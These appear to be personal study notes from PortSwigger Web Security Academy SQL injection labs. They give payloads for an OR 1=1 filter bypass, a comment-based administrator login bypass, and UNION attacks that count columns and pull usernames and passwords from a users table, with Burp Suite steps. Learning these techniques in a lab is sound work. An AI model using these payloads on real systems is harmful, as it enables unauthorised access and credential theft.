### sql injection

hint: internal server error on http route.  
 '+OR+1=1-- #will query all #SELECT \* FROM products WHERE catergory = '' or 1+1--' equivalent.
ex: https://0aa000d504428d79c0e803da00430076.web-security-academy.net/filter?category=%27+OR+1=1--

### SQL injection vulnerability allowing login bypass

Use burp suite to intercept and modify login.
modify username with parameter administrator'--

### SQL union injection

2 requirements:
How many columns are being returned from the original query?
Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

Continue adding null values until the error disappears and the response includes additional content containing the null values.  
ex: /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/1.1  
-NULL is a special keyword that matches any data type.
-add NULLs if 'internal server error'
ex: '+UNION+SELECT+NULL,NULL,NULL--

### Lab: SQL injection UNION attack, finding a column containing text

Use Burp Suite to intercept and modify the request that sets the product category filter.
Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
'+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value provided by the lab, for example:
'+UNION+SELECT+'abcdef',NULL,NULL--
If an error occurs, move on to the next null and try that instead.

### SQL injection UNION attack, retrieving data from other tables

Find number of columns using NULL  
'+UNION+SELECT+NULL,NULL--  
Check columns for string values  
'+UNION+SELECT+'string','string2'--
Replace strings to search for username and password on table users
'+UNION+SELECT+username,+password+FROM+users--
right click - show response in browser, open new tab, paste.
get administrator password, and paste into login.

### SQL injection UNION attack, retrieving multiple values in a single column

intercept cateogry, move to repeater  
in repeater find column size  
'+UNION+SELECT+NULL,'string'--  
locate string for username/password injection  
concat username and password into string starr is used to seperate values so you can find easily  
'+UNION+SELECT+NULL,username||'\*'||password+FROM+users--  
right click response show response in browser  
grab administrator password and login
